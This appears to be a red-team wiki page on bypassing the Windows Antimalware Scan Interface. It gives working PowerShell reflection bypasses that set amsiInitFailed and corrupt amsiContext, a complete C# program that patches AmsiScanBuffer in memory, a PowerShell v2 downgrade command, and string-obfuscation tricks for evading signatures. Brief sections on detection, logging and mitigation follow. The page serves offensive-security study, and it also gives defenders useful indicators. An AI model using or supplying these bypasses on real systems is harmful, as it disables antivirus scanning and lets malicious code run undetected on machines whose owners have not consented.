% Filename: 06-red-teaming/evasion/amsi-bypass.md
% Display name: AMSI Bypass
% Last update: 2026-02-11
% ATT&CK Tactics: TA0005 (Defense Evasion)
% ATT&CK Techniques: T1562.001 (Impair Defenses: Disable or Modify Tools)
% Authors: @TristanInSec

# AMSI Bypass

## Overview

The Antimalware Scan Interface (AMSI) is a Windows API that allows applications to send content to the installed antivirus engine for scanning before execution. PowerShell, VBScript, JScript, .NET (4.8+), and Office VBA macros all use AMSI to scan scripts and in-memory content. Bypassing AMSI is often the first step in a red team engagement on Windows — without it, most PowerShell tooling and .NET assemblies will be caught.

## ATT&CK Mapping

- **Tactic:** TA0005 - Defense Evasion
- **Technique:** T1562.001 - Impair Defenses: Disable or Modify Tools

## Techniques

### How AMSI Works

```text
1. User runs PowerShell script or .NET assembly
2. The host application (powershell.exe, cscript.exe, etc.) calls AmsiScanBuffer()
3. amsi.dll passes the content to the registered AV provider
4. AV returns AMSI_RESULT (clean, detected, blocked)
5. Host application decides whether to execute based on the result

Key functions in amsi.dll:
  AmsiInitialize()    — Initialize AMSI for the current process
  AmsiOpenSession()   — Open a scan session
  AmsiScanBuffer()    — Scan a buffer of content
  AmsiScanString()    — Scan a string
  AmsiCloseSession()  — Close the session
```

### Reflection — amsiInitFailed Flag

Sets the internal `amsiInitFailed` flag in the PowerShell AMSI integration layer to `true`,
which causes `AmsiUtils` to skip scanning. This does not patch any native code:

```powershell
# PowerShell AMSI bypass — set amsiInitFailed to true via reflection
# This disables AMSI in the current PowerShell process only

$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f = $a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)
```

### Reflection — amsiContext Corruption

Corrupts the `amsiContext` struct by overwriting its first 4 bytes with zero. When
`AmsiScanBuffer` dereferences the corrupted context it fails with an error code, causing
the host to treat scanning as unavailable and allow execution:

```powershell
# PowerShell AMSI bypass — corrupt the amsiContext struct header
# String split avoids triggering AMSI string signatures on 'AmsiUtils'

$w = 'System.Management.Automation.A]msiUtils'.Replace(']','')
$c = [Ref].Assembly.GetType($w)
$f = $c.GetField('amsiContext','NonPublic,Static')
[IntPtr]$ptr = $f.GetValue($null)
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

### Memory Patching — C# Implementation

```csharp
// C# AMSI bypass — patch AmsiScanBuffer in amsi.dll
// Run before loading any .NET tooling

using System;
using System.Runtime.InteropServices;

class AmsiBypass {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    static void Main() {
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(amsi, "AmsiScanBuffer");

        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)6, 0x40, out oldProtect);

        // Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
        // This makes AmsiScanBuffer return an error code
        // which the caller interprets as "scan not available" → allow execution
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, addr, patch.Length);

        VirtualProtect(addr, (UIntPtr)6, oldProtect, out oldProtect);
    }
}
```

### PowerShell Downgrade

```powershell
# PowerShell v2 does not support AMSI
# If .NET Framework 2.0 is still installed, PowerShell v2 can be used

# Check if PowerShell v2 is available
powershell -Version 2 -Command "Write-Host 'AMSI not loaded in v2'"

# Note: PowerShell v2 is removed by default on modern Windows
# but may still be present on older systems or if manually enabled
```

### CLR Hooking (Hardware Breakpoints)

```text
Advanced technique: Set a hardware breakpoint on AmsiScanBuffer

1. Use SetThreadContext to set a hardware breakpoint on AmsiScanBuffer
2. When the breakpoint fires, modify the return value via the exception handler
3. Resume execution — AMSI thinks the scan returned clean

Advantage: No memory patching (nothing for EDR's memory scanning to detect)
Disadvantage: More complex, per-thread, requires exception handling setup
```

### Obfuscation to Bypass AMSI String Signatures

```powershell
# AMSI scans the script text — obfuscation can bypass string-based signatures

# String concatenation
$a = 'Ams'; $b = 'iUt'; $c = 'ils'
$class = $a + $b + $c

# Base64 encoding
$encoded = [System.Convert]::FromBase64String('QW1zaVV0aWxz')
$class = [System.Text.Encoding]::UTF8.GetString($encoded)

# XOR encoding
# Encode strings at build time, decode at runtime
```

## Detection Methods

### Host-Based Detection

- ETW events from the AMSI provider (Microsoft-Antimalware-Scan-Interface)
- Memory integrity checks on amsi.dll (detect patched functions)
- Monitoring for PowerShell v2 downgrade attempts
- Process behavior: loading amsi.dll then immediately calling VirtualProtect on it

### Logging

- Windows Event Log: Microsoft-Windows-PowerShell/Operational (Event ID 4104 — Script Block Logging)
- AMSI provider ETW events (if ETW is not also bypassed)

## Mitigation Strategies

- **Remove PowerShell v2** — disable the Windows feature to prevent downgrade attacks
- **Enable Script Block Logging** — log all PowerShell scripts regardless of AMSI
- **Constrained Language Mode** — restrict PowerShell to safe cmdlets only
- **EDR memory protection** — monitor for VirtualProtect calls on security DLLs

## References

### MITRE ATT&CK

- [T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)
